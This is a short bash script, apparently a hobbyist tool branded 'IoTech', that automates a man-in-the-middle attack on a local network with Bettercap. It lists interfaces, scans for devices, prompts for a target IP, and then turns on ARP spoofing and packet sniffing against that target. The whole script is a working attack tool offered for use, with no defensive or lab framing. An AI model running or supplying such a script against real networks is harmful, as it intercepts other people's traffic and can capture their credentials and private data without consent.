# Ansi color code variables
orange="\033[0;33m"
green="\e[0;92m"
reset="\e[0m"
red="\033[0;31m"

# run script
echo -e "${green}[1/2]Check encryption!${reset}"
sleep 1

echo -e "${green}  _             ___    _____         _     ${reset}"
echo -e "${green} | |__  _   _  |_ _|__|_   _|__  ___| |__  ${reset}"
echo -e "${green} | '_ \| | | |  | |/ _ \| |/ _ \/ __| '_ \ ${reset}"
echo -e "${green} | |_) | |_| |  | | (_) | |  __/ (__| | | |${reset}"
echo -e "${green} |_.__/ \__, | |___\___/|_|\___|\___|_| |_|${reset}"
echo -e "${green}        |___/                              ${reset}"

sleep 5

# show network interfaces
echo "Show network interfaces..."
sleep 2
ifconfig 
sleep 3

# input network interface
read -p "Select your Networkinterface: " netint

echo -e "${red}Selected: ${netint} ${reset}"

echo -e "${orange}Loading Bettercap...${reset}"
echo "[ctrl+c to interrupt]"
echo "Wait 10 secounds..."
sleep 10


# run Bettercat in this Interface
echo "Collecting devices..."
sleep 1
sudo bettercap -iface $netint -caplet control
sleep 3 

# set target and rund spoofing!
read -p "Select your Target: " target
echo -e "${red}Selected target: ${target} ${reset}"
command="set arp.spoof.targets $target"

echo -e "${orange}Loading Bettercap...${reset}"
echo "[ctrl+c to interrupt]"
echo "Wait 10 secounds..."
sleep 10

sudo bettercap -iface $netint -eval "$command; arp.spoof on; net.sniff on" 



